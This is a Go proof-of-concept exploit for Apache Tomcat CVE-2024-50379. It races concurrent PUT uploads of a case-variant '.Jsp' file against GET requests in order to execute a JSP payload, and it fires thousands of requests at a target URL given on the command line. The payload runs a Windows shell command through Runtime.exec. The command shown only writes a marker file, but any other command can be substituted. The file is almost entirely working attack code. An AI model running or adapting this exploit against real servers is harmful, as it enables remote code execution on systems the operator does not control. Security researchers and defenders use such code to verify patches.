package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
)

func check(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	targetUrl := url
	fmt.Println(targetUrl)

	targetUrlPut1 := targetUrl + "aa.Jsp"
	targetUrlPut2 := targetUrl + "bb.Jsp"
	targetUrlGet1 := targetUrl + "aa.jsp"
	targetUrlGet2 := targetUrl + "bb.jsp"

	headers1 := map[string]string{
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Content-Type": "application/json",
	}
	headers2 := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	}

	payloadPut := "<% String[] commands = { \"cmd\", \"/c\", \"echo tomcat-cve-2024-50379-demo > ..\\\\webapps\\\\ROOT\\\\poc.jsp\"};" +
		"Runtime.getRuntime().exec(commands);" +
		"%>"

	// 并发执行 1000 轮请求
	var innerWg sync.WaitGroup
	innerWg.Add(1000 * 4)

	for i := 0; i < 1000; i++ {
		// 使用 goroutine 并发发送 PUT 请求
		go func() {
			defer innerWg.Done()
			_, err := makeRequest("PUT", targetUrlPut1, headers1, payloadPut)
			if err != nil {
				fmt.Println(err.Error())
			}
		}()

		go func() {
			defer innerWg.Done()
			_, err := makeRequest("PUT", targetUrlPut2, headers1, payloadPut)
			if err != nil {
				fmt.Println(err.Error())
			}
		}()

		// 使用 goroutine 并发发送 GET 请求
		go func() {
			defer innerWg.Done()
			_, err := makeRequest("GET", targetUrlGet1, headers2, "")
			if err != nil {
				fmt.Println(err.Error())
			}
		}()

		go func() {
			defer innerWg.Done()
			_, err := makeRequest("GET", targetUrlGet2, headers2, "")
			if err != nil {
				fmt.Println(err.Error())
			}
		}()
	}

	innerWg.Wait()
}

func makeRequest(method, url string, headers map[string]string, payload string) (*http.Response, error) {
	client := &http.Client{}

	req, err := http.NewRequest(method, url, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	//defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode == 200 {
		fmt.Println("success")
		return resp, nil
	}

	return nil, fmt.Errorf("non-200 status code: %d", resp.StatusCode)
}

func main() {
	urlPtr := flag.String("u", "", "Single URL to check")
	flag.Parse()

	var wg sync.WaitGroup

	if *urlPtr != "" {
		wg.Add(1)
		go check(*urlPtr, &wg)
	} else {
		fmt.Println("Please provide a URL")
		return
	}

	wg.Wait()
}
